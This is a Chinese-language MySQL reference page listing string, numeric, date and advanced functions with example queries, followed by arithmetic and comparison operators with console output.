<h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><p>函数    描述    实例<br>ASCII(s)    返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：</p>
<p>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar<br>FROM Customers;<br>CHAR_LENGTH(s)    返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数</p>
<p>SELECT CHAR_LENGTH(“RUNOOB”) AS LengthOfString;<br>CHARACTER_LENGTH(s)    返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数</p>
<p>SELECT CHARACTER_LENGTH(“RUNOOB”) AS LengthOfString;<br>CONCAT(s1,s2…sn)    字符串 s1,s2 等多个字符串合并为一个字符串<br>合并多个字符串</p>
<p>SELECT CONCAT(“SQL “, “Runoob “, “Gooogle “, “Facebook”) AS ConcatenatedString;<br>CONCAT_WS(x, s1,s2…sn)    同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符<br>合并多个字符串，并添加分隔符：</p>
<p>SELECT CONCAT_WS(“-“, “SQL”, “Tutorial”, “is”, “fun!”)AS ConcatenatedString;<br>FIELD(s,s1,s2…)    返回第一个字符串 s 在字符串列表(s1,s2…)中的位置<br>返回字符串 c 在列表值中的位置：</p>
<p>SELECT FIELD(“c”, “a”, “b”, “c”, “d”, “e”);<br>FIND_IN_SET(s1,s2)    返回在字符串s2中与s1匹配的字符串的位置<br>返回字符串 c 在指定字符串中的位置：</p>
<p>SELECT FIND_IN_SET(“c”, “a,b,c,d,e”);<br>FORMAT(x,n)    函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。<br>格式化数字 “#,###.##” 形式：</p>
<p>SELECT FORMAT(250500.5634, 2);     – 输出 250,500.56<br>INSERT(s1,x,len,s2)    字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串<br>从字符串第一个位置开始的 6 个字符替换为 runoob：</p>
<p>SELECT INSERT(“google.com”, 1, 6, “runnob”);  – 输出：runoob.com<br>LOCATE(s1,s)    从字符串 s 中获取 s1 的开始位置<br>获取 b 在字符串 abc 中的位置：</p>
<p>SELECT LOCATE(‘st’,’myteststring’);  – 5<br>返回字符串 abc 中 b 的位置：</p>
<p>SELECT LOCATE(‘b’, ‘abc’) – 2<br>LCASE(s)    将字符串 s 的所有字母变成小写字母<br>字符串 RUNOOB 转换为小写：</p>
<p>SELECT LCASE(‘RUNOOB’) – runoob<br>LEFT(s,n)    返回字符串 s 的前 n 个字符<br>返回字符串 runoob 中的前两个字符：</p>
<p>SELECT LEFT(‘runoob’,2) – ru<br>LOWER(s)    将字符串 s 的所有字母变成小写字母<br>字符串 RUNOOB 转换为小写：</p>
<p>SELECT LOWER(‘RUNOOB’) – runoob<br>LPAD(s1,len,s2)    在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len<br>将字符串 xx 填充到 abc 字符串的开始处：</p>
<p>SELECT LPAD(‘abc’,5,’xx’) – xxabc<br>LTRIM(s)    去掉字符串 s 开始处的空格<br>去掉字符串 RUNOOB开始处的空格：</p>
<p>SELECT LTRIM(“    RUNOOB”) AS LeftTrimmedString;– RUNOOB<br>MID(s,n,len)    从字符串 s 的 start 位置截取长度为 length 的子字符串，同 SUBSTRING(s,n,len)<br>从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：</p>
<p>SELECT MID(“RUNOOB”, 2, 3) AS ExtractString; – UNO<br>POSITION(s1 IN s)    从字符串 s 中获取 s1 的开始位置<br>返回字符串 abc 中 b 的位置：</p>
<p>SELECT POSITION(‘b’ in ‘abc’) – 2<br>REPEAT(s,n)    将字符串 s 重复 n 次<br>将字符串 runoob 重复三次：</p>
<p>SELECT REPEAT(‘runoob’,3) – runoobrunoobrunoob<br>REPLACE(s,s1,s2)    将字符串 s2 替代字符串 s 中的字符串 s1<br>将字符串 abc 中的字符 a 替换为字符 x：</p>
<p>SELECT REPLACE(‘abc’,’a’,’x’) –xbc<br>REVERSE(s)    将字符串s的顺序反过来<br>将字符串 abc 的顺序反过来：</p>
<p>SELECT REVERSE(‘abc’) – cba<br>RIGHT(s,n)    返回字符串 s 的后 n 个字符<br>返回字符串 runoob 的后两个字符：</p>
<p>SELECT RIGHT(‘runoob’,2) – ob<br>RPAD(s1,len,s2)    在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len<br>将字符串 xx 填充到 abc 字符串的结尾处：</p>
<p>SELECT RPAD(‘abc’,5,’xx’) – abcxx<br>RTRIM(s)    去掉字符串 s 结尾处的空格<br>去掉字符串 RUNOOB 的末尾空格：</p>
<p>SELECT RTRIM(“RUNOOB     “) AS RightTrimmedString;   – RUNOOB<br>SPACE(n)    返回 n 个空格<br>返回 10 个空格：</p>
<p>SELECT SPACE(10);<br>STRCMP(s1,s2)    比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1<br>比较字符串：</p>
<p>SELECT STRCMP(“runoob”, “runoob”);  – 0<br>SUBSTR(s, start, length)    从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：</p>
<p>SELECT SUBSTR(“RUNOOB”, 2, 3) AS ExtractString; – UNO<br>SUBSTRING(s, start, length)    从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：</p>
<p>SELECT SUBSTRING(“RUNOOB”, 2, 3) AS ExtractString; – UNO<br>SUBSTRING_INDEX(s, delimiter, number)    返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。<br>如果 number 是正数，返回第 number 个字符左边的字符串。<br>如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,1) – a<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,-1)    – b<br>SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(‘a<em>b</em>c<em>d</em>e’,’<em>‘,3),’</em>‘,-1)    – c<br>TRIM(s)    去掉字符串 s 开始和结尾处的空格<br>去掉字符串 RUNOOB 的首尾空格：</p>
<p>SELECT TRIM(‘    RUNOOB    ‘) AS TrimmedString;<br>UCASE(s)    将字符串转换为大写<br>将字符串 runoob 转换为大写：</p>
<p>SELECT UCASE(“runoob”); – RUNOOB<br>UPPER(s)    将字符串转换为大写<br>将字符串 runoob 转换为大写：</p>
<p>SELECT UPPER(“runoob”); – RUNOOB</p>
<h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><p>函数名    描述    实例<br>ABS(x)    返回 x 的绝对值　　<br>返回 -1 的绝对值：</p>
<p>SELECT ABS(-1) – 返回1<br>ACOS(x)    求 x 的反余弦值(参数是弧度)<br>SELECT ACOS(0.25);<br>ASIN(x)    求反正弦值(参数是弧度)<br>SELECT ASIN(0.25);<br>ATAN(x)    求反正切值(参数是弧度)<br>SELECT ATAN(2.5);<br>ATAN2(n, m)    求反正切值(参数是弧度)<br>SELECT ATAN2(-0.8, 2);<br>AVG(expression)    返回一个表达式的平均值，expression 是一个字段<br>返回 Products 表中Price 字段的平均值：</p>
<p>SELECT AVG(Price) AS AveragePrice FROM Products;<br>CEIL(x)    返回大于或等于 x 的最小整数　<br>SELECT CEIL(1.5) – 返回2<br>CEILING(x)    返回大于或等于 x 的最小整数　<br>SELECT CEIL(1.5) – 返回2<br>COS(x)    求余弦值(参数是弧度)<br>SELECT COS(2);<br>COT(x)    求余切值(参数是弧度)<br>SELECT COT(6);<br>COUNT(expression)    返回查询的记录总数，expression 参数是一个字段或者 * 号<br>返回 Products 表中 products 字段总共有多少条记录：</p>
<p>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;<br>DEGREES(x)    将弧度转换为角度　　<br>SELECT DEGREES(3.1415926535898) – 180<br>n DIV m    整除，n 为被除数，m 为除数<br>计算 10 除于 5：</p>
<p>SELECT 10 DIV 5;  – 2<br>EXP(x)    返回 e 的 x 次方　　<br>计算 e 的三次方：</p>
<p>SELECT EXP(3) – 20.085536923188<br>FLOOR(x)    返回小于或等于 x 的最大整数　　<br>小于或等于 1.5 的整数：</p>
<p>SELECT FLOOR(1.5) – 返回1<br>GREATEST(expr1, expr2, expr3, …)    返回列表中的最大值<br>返回以下数字列表中的最大值：</p>
<p>SELECT GREATEST(3, 12, 34, 8, 25); – 34<br>返回以下字符串列表中的最大值：</p>
<p>SELECT GREATEST(“Google”, “Runoob”, “Apple”);   – Runoob<br>LEAST(expr1, expr2, expr3, …)    返回列表中的最小值<br>返回以下数字列表中的最小值：</p>
<p>SELECT LEAST(3, 12, 34, 8, 25); – 3<br>返回以下字符串列表中的最小值：</p>
<p>SELECT LEAST(“Google”, “Runoob”, “Apple”);   – Apple<br>LN    返回数字的自然对数<br>返回 2 的自然对数：</p>
<p>SELECT LN(2);  – 0.6931471805599453<br>LOG(x)    返回自然对数(以 e 为底的对数)　　<br>SELECT LOG(20.085536923188) – 3<br>LOG10(x)    返回以 10 为底的对数　　<br>SELECT LOG10(100) – 2<br>LOG2(x)    返回以 2 为底的对数<br>返回以 2 为底 6 的对数：</p>
<p>SELECT LOG2(6);  – 2.584962500721156<br>MAX(expression)    返回字段 expression 中的最大值<br>返回数据表 Products 中字段 Price 的最大值：</p>
<p>SELECT MAX(Price) AS LargestPrice FROM Products;<br>MIN(expression)    返回字段 expression 中的最小值<br>返回数据表 Products 中字段 Price 的最小值：</p>
<p>SELECT MIN(Price) AS LargestPrice FROM Products;<br>MOD(x,y)    返回 x 除以 y 以后的余数　<br>5 除于 2 的余数：</p>
<p>SELECT MOD(5,2) – 1<br>PI()    返回圆周率(3.141593）　　<br>SELECT PI() –3.141593<br>POW(x,y)    返回 x 的 y 次方　<br>2 的 3 次方：</p>
<p>SELECT POW(2,3) – 8<br>POWER(x,y)    返回 x 的 y 次方　<br>2 的 3 次方：</p>
<p>SELECT POWER(2,3) – 8<br>RADIANS(x)    将角度转换为弧度　　<br>180 度转换为弧度：</p>
<p>SELECT RADIANS(180) – 3.1415926535898<br>RAND()    返回 0 到 1 的随机数　　<br>SELECT RAND() –0.93099315644334<br>ROUND(x)    返回离 x 最近的整数<br>SELECT ROUND(1.23456) –1<br>SIGN(x)    返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1　<br>SELECT SIGN(-10) – (-1)<br>SIN(x)    求正弦值(参数是弧度)　　<br>SELECT SIN(RADIANS(30)) – 0.5<br>SQRT(x)    返回x的平方根　　<br>25 的平方根：</p>
<p>SELECT SQRT(25) – 5<br>SUM(expression)    返回指定字段的总和<br>计算 OrderDetails 表中字段 Quantity 的总和：</p>
<p>SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails;<br>TAN(x)    求正切值(参数是弧度)<br>SELECT TAN(1.75);  – -5.52037992250933<br>TRUNCATE(x,y)    返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）<br>SELECT TRUNCATE(1.23456,3) – 1.234</p>
<h2 id="MySQL-日期函数"><a href="#MySQL-日期函数" class="headerlink" title="MySQL 日期函数"></a>MySQL 日期函数</h2><p>函数名    描述    实例<br>ADDDATE(d,n)    计算起始日期 d 加上 n 天的日期<br>SELECT ADDDATE(“2017-06-15”, INTERVAL 10 DAY);<br>-&gt;2017-06-25<br>ADDTIME(t,n)    时间 t 加上 n 秒的时间<br>SELECT ADDTIME(‘2011-11-11 11:11:11’, 5)<br>-&gt;2011-11-11 11:11:16 (秒)<br>CURDATE()    返回当前日期<br>SELECT CURDATE();<br>-&gt; 2018-09-19<br>CURRENT_DATE()    返回当前日期<br>SELECT CURRENT_DATE();<br>-&gt; 2018-09-19<br>CURRENT_TIME    返回当前时间<br>SELECT CURRENT_TIME();<br>-&gt; 19:59:02<br>CURRENT_TIMESTAMP()    返回当前日期和时间<br>SELECT CURRENT_TIMESTAMP()<br>-&gt; 2018-09-19 20:57:43<br>CURTIME()    返回当前时间<br>SELECT CURTIME();<br>-&gt; 19:59:02<br>DATE()    从日期或日期时间表达式中提取日期值<br>SELECT DATE(“2017-06-15”);<br>-&gt; 2017-06-15<br>DATEDIFF(d1,d2)    计算日期 d1-&gt;d2 之间相隔的天数<br>SELECT DATEDIFF(‘2001-01-01’,’2001-02-02’)<br>-&gt; -32<br>DATE_ADD(d，INTERVAL expr type)    计算起始日期 d 加上一个时间段后的日期<br>SELECT ADDDATE(‘2011-11-11 11:11:11’,1)<br>-&gt; 2011-11-12 11:11:11    (默认是天)</p>
<p>SELECT ADDDATE(‘2011-11-11 11:11:11’, INTERVAL 5 MINUTE)<br>-&gt; 2011-11-11 11:16:11 (TYPE的取值与上面那个列出来的函数类似)<br>DATE_FORMAT(d,f)    按表达式 f的要求显示日期 d<br>SELECT DATE_FORMAT(‘2011-11-11 11:11:11’,’%Y-%m-%d %r’)<br>-&gt; 2011-11-11 11:11:11 AM<br>DATE_SUB(date,INTERVAL expr type)    函数从日期减去指定的时间间隔。<br>Orders 表中 OrderDate 字段减去 2 天：</p>
<p>SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate<br>FROM Orders<br>DAY(d)    返回日期值 d 的日期部分<br>SELECT DAY(“2017-06-15”);<br>-&gt; 15<br>DAYNAME(d)    返回日期 d 是星期几，如 Monday,Tuesday<br>SELECT DAYNAME(‘2011-11-11 11:11:11’)<br>-&gt;Friday<br>DAYOFMONTH(d)    计算日期 d 是本月的第几天<br>SELECT DAYOFMONTH(‘2011-11-11 11:11:11’)<br>-&gt;11<br>DAYOFWEEK(d)    日期 d 今天是星期几，1 星期日，2 星期一，以此类推<br>SELECT DAYOFWEEK(‘2011-11-11 11:11:11’)<br>-&gt;6<br>DAYOFYEAR(d)    计算日期 d 是本年的第几天<br>SELECT DAYOFYEAR(‘2011-11-11 11:11:11’)<br>-&gt;315<br>EXTRACT(type FROM d)    从日期 d 中获取指定的值，type 指定返回的值。<br>type可取值为：<br>MICROSECOND<br>SECOND<br>MINUTE<br>HOUR<br>DAY<br>WEEK<br>MONTH<br>QUARTER<br>YEAR<br>SECOND_MICROSECOND<br>MINUTE_MICROSECOND<br>MINUTE_SECOND<br>HOUR_MICROSECOND<br>HOUR_SECOND<br>HOUR_MINUTE<br>DAY_MICROSECOND<br>DAY_SECOND<br>DAY_MINUTE<br>DAY_HOUR<br>YEAR_MONTH<br>SELECT EXTRACT(MINUTE FROM ‘2011-11-11 11:11:11’)<br>-&gt; 11<br>FROM_DAYS(n)    计算从 0000 年 1 月 1 日开始 n 天后的日期<br>SELECT FROM_DAYS(1111)<br>-&gt; 0003-01-16<br>HOUR(t)    返回 t 中的小时值<br>SELECT HOUR(‘1:2:3’)<br>-&gt; 1<br>LAST_DAY(d)    返回给给定日期的那一月份的最后一天<br>SELECT LAST_DAY(“2017-06-20”);<br>-&gt; 2017-06-30<br>LOCALTIME()    返回当前日期和时间<br>SELECT LOCALTIME()<br>-&gt; 2018-09-19 20:57:43<br>LOCALTIMESTAMP()    返回当前日期和时间<br>SELECT LOCALTIMESTAMP()<br>-&gt; 2018-09-19 20:57:43<br>MAKEDATE(year, day-of-year)    基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期<br>SELECT MAKEDATE(2017, 3);<br>-&gt; 2017-01-03<br>MAKETIME(hour, minute, second)    组合时间，参数分别为小时、分钟、秒<br>SELECT MAKETIME(11, 35, 4);<br>-&gt; 11:35:04<br>MICROSECOND(date)    返回日期参数所对应的毫秒数<br>SELECT MICROSECOND(“2017-06-20 09:34:00.000023”);<br>-&gt; 23<br>MINUTE(t)    返回 t 中的分钟值<br>SELECT MINUTE(‘1:2:3’)<br>-&gt; 2<br>MONTHNAME(d)    返回日期当中的月份名称，如 Janyary<br>SELECT MONTHNAME(‘2011-11-11 11:11:11’)<br>-&gt; November<br>MONTH(d)    返回日期d中的月份值，1 到 12<br>SELECT MONTH(‘2011-11-11 11:11:11’)<br>-&gt;11<br>NOW()    返回当前日期和时间<br>SELECT NOW()<br>-&gt; 2018-09-19 20:57:43<br>PERIOD_ADD(period, number)    为 年-月 组合日期添加一个时段<br>SELECT PERIOD_ADD(201703, 5);<br>-&gt; 201708<br>PERIOD_DIFF(period1, period2)    返回两个时段之间的月份差值<br>SELECT PERIOD_DIFF(201710, 201703);<br>-&gt; 7<br>QUARTER(d)    返回日期d是第几季节，返回 1 到 4<br>SELECT QUARTER(‘2011-11-11 11:11:11’)<br>-&gt; 4<br>SECOND(t)    返回 t 中的秒钟值<br>SELECT SECOND(‘1:2:3’)<br>-&gt; 3<br>SEC_TO_TIME(s)    将以秒为单位的时间 s 转换为时分秒的格式<br>SELECT SEC_TO_TIME(4320)<br>-&gt; 01:12:00<br>STR_TO_DATE(string, format_mask)    将字符串转变为日期<br>SELECT STR_TO_DATE(“August 10 2017”, “%M %d %Y”);<br>-&gt; 2017-08-10<br>SUBDATE(d,n)    日期 d 减去 n 天后的日期<br>SELECT SUBDATE(‘2011-11-11 11:11:11’, 1)<br>-&gt;2011-11-10 11:11:11 (默认是天)<br>SUBTIME(t,n)    时间 t 减去 n 秒的时间<br>SELECT SUBTIME(‘2011-11-11 11:11:11’, 5)<br>-&gt;2011-11-11 11:11:06 (秒)<br>SYSDATE()    返回当前日期和时间<br>SELECT SYSDATE()<br>-&gt; 2018-09-19 20:57:43<br>TIME(expression)    提取传入表达式的时间部分<br>SELECT TIME(“19:30:10”);<br>-&gt; 19:30:10<br>TIME_FORMAT(t,f)    按表达式 f 的要求显示时间 t<br>SELECT TIME_FORMAT(‘11:11:11’,’%r’)<br>11:11:11 AM<br>TIME_TO_SEC(t)    将时间 t 转换为秒<br>SELECT TIME_TO_SEC(‘1:12:00’)<br>-&gt; 4320<br>TIMEDIFF(time1, time2)    计算时间差值<br>SELECT TIMEDIFF(“13:10:11”, “13:10:10”);<br>-&gt; 00:00:01<br>TIMESTAMP(expression, interval)    单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和<br>SELECT TIMESTAMP(“2017-07-23”,  “13:10:11”);<br>-&gt; 2017-07-23 13:10:11<br>TO_DAYS(d)    计算日期 d 距离 0000 年 1 月 1 日的天数<br>SELECT TO_DAYS(‘0001-01-01 01:01:01’)<br>-&gt; 366<br>WEEK(d)    计算日期 d 是本年的第几个星期，范围是 0 到 53<br>SELECT WEEK(‘2011-11-11 11:11:11’)<br>-&gt; 45<br>WEEKDAY(d)    日期 d 是星期几，0 表示星期一，1 表示星期二<br>SELECT WEEKDAY(“2017-06-15”);<br>-&gt; 3<br>WEEKOFYEAR(d)    计算日期 d 是本年的第几个星期，范围是 0 到 53<br>SELECT WEEKOFYEAR(‘2011-11-11 11:11:11’)<br>-&gt; 45<br>YEAR(d)    返回年份<br>SELECT YEAR(“2017-06-15”);<br>-&gt; 2017<br>YEARWEEK(date, mode)    返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推<br>SELECT YEARWEEK(“2017-06-15”);<br>-&gt; 201724</p>
<h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><p>函数名    描述    实例<br>BIN(x)    返回 x 的二进制编码<br>15 的 2 进制编码:</p>
<p>SELECT BIN(15); – 1111<br>BINARY(s)    将字符串 s 转换为二进制字符串<br>SELECT BINARY “RUNOOB”;<br>-&gt; RUNOOB<br>CASE expression<br>    WHEN condition1 THEN result1<br>    WHEN condition2 THEN result2<br>   …<br>    WHEN conditionN THEN resultN<br>    ELSE result<br>END    CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。<br>SELECT CASE<br>　　WHEN 1 &gt; 0<br>　　THEN ‘1 &gt; 0’<br>　　WHEN 2 &gt; 0<br>　　THEN ‘2 &gt; 0’<br>　　ELSE ‘3 &gt; 0’<br>　　END<br>-&gt;1 &gt; 0<br>CAST(x AS type)    转换数据类型<br>字符串日期转换为日期：</p>
<p>SELECT CAST(“2017-08-29” AS DATE);<br>-&gt; 2017-08-29<br>COALESCE(expr1, expr2, …., expr_n)    返回参数中的第一个非空表达式（从左向右）<br>SELECT COALESCE(NULL, NULL, NULL, ‘runoob.com’, NULL, ‘google.com’);<br>-&gt; runoob.com<br>CONNECTION_ID()    返回服务器的连接数<br>SELECT CONNECTION_ID();<br>-&gt; 4292835<br>CONV(x,f1,f2)    返回 f1 进制数变成 f2 进制数<br>SELECT CONV(15, 10, 2);<br>-&gt; 1111<br>CONVERT(s USING cs)    函数将字符串 s 的字符集变成 cs<br>SELECT CHARSET(‘ABC’)<br>-&gt;utf-8    </p>
<p>SELECT CHARSET(CONVERT(‘ABC’ USING gbk))<br>-&gt;gbk<br>CURRENT_USER()    返回当前用户<br>SELECT CURRENT_USER();<br>-&gt; guest@%<br>DATABASE()    返回当前数据库名<br>SELECT DATABASE();<br>-&gt; runoob<br>IF(expr,v1,v2)    如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。<br>SELECT IF(1 &gt; 0,’正确’,’错误’)<br>-&gt;正确<br>IFNULL(v1,v2)    如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。<br>SELECT IFNULL(null,’Hello Word’)<br>-&gt;Hello Word<br>ISNULL(expression)    判断表达式是否为 NULL<br>SELECT ISNULL(NULL);<br>-&gt;1<br>LAST_INSERT_ID()    返回最近生成的 AUTO_INCREMENT 值<br>SELECT LAST_INSERT_ID();<br>-&gt;6<br>NULLIF(expr1, expr2)    比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1<br>SELECT NULLIF(25, 25);<br>-&gt;<br>SESSION_USER()    返回当前用户<br>SELECT SESSION_USER();<br>-&gt; guest@%<br>SYSTEM_USER()    返回当前用户<br>SELECT SYSTEM_USER();<br>-&gt; guest@%<br>USER()    返回当前用户<br>SELECT USER();<br>-&gt; guest@%<br>VERSION()    返回数据库的版本号<br>SELECT VERSION()<br>-&gt; 5.6.34</p>
<h1 id="MySQL-运算符"><a href="#MySQL-运算符" class="headerlink" title="MySQL 运算符"></a>MySQL 运算符</h1><p>本章节我们主要介绍 MySQL 的运算符及运算符的优先级。 MySQL 主要有以下几种运算符：</p>
<ol>
<li>算术运算符</li>
<li>比较运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
</ol>
<h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>MySQL 支持的算术运算符包括:</p>
<p>运算符    作用</p>
<ul>
<li>加法</li>
</ul>
<ul>
<li>减法</li>
</ul>
<ul>
<li>乘法<br>/ 或 DIV    除法<br>% 或 MOD    取余</li>
</ul>
<p>在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。</p>
<p>1、加<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1+2;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 1+2 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   3 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>2、减<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1-2;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 1-2 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|  -1 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>3、乘<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2*3;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 2*3 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   6 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>4、除<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2/3;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 2/3    |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 0.6667 |</span><br><span class="line">+<span class="comment">--------+</span></span><br></pre></td></tr></table></figure></p>
<p>5、商<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 10 DIV 4;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| 10 DIV 4 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        2 |</span><br><span class="line">+<span class="comment">----------+</span></span><br></pre></td></tr></table></figure></p>
<p>6、取余<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 10 MOD 4;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| 10 MOD 4 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        2 |</span><br><span class="line">+<span class="comment">----------+</span></span><br></pre></td></tr></table></figure></p>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。</p>
<p>符号    描述    备注<br>=    等于<br>&lt;&gt;, !=    不等于    </p>
<blockquote>
<p>   大于<br>&lt;    小于<br>&lt;=    小于等于<br>=    大于等于<br>BETWEEN    在两值之间    &gt;=min&amp;&amp;&lt;=max<br>NOT BETWEEN    不在两值之间<br>IN    在集合中<br>NOT IN    不在集合中<br>&lt;=&gt;    严格比较两个NULL值是否相等    两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0<br>LIKE    模糊匹配<br>REGEXP 或 RLIKE    正则式匹配<br>IS NULL    为空<br>IS NOT NULL    不为空</p>
</blockquote>
<p>1、等于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2=3;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 2=3 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   0 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">mysql&gt; select NULL = NULL;</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| NULL = NULL |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">|        NULL |</span><br><span class="line">+<span class="comment">-------------+</span></span><br></pre></td></tr></table></figure></p>
<p>2、不等于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&lt;&gt;3;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 2&lt;&gt;3 |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">|    1 |</span><br><span class="line">+<span class="comment">------+</span></span><br></pre></td></tr></table></figure></p>
<p>3、安全等于</p>
<p>与 = 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=&gt;3;</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| 2&lt;=&gt;3 |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">|     0 |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">mysql&gt; select null=null;</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| null=null |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|      NULL |</span><br><span class="line">+<span class="comment">-----------+    </span></span><br><span class="line">mysql&gt; select null&lt;=&gt;null;</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| null&lt;=&gt;null |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">|           1 |</span><br><span class="line">+<span class="comment">-------------+</span></span><br></pre></td></tr></table></figure></p>
<p>4、小于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&lt;3;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 2&lt;3 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   1 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>5、小于等于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=3;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 2&lt;=3 |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">|    1 |</span><br><span class="line">+<span class="comment">------+</span></span><br></pre></td></tr></table></figure></p>
<p>6、大于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&gt;3;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 2&gt;3 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   0 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>7、大于等于<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2&gt;=3;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 2&gt;=3 |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">|    0 |</span><br><span class="line">+<span class="comment">------+</span></span><br></pre></td></tr></table></figure></p>
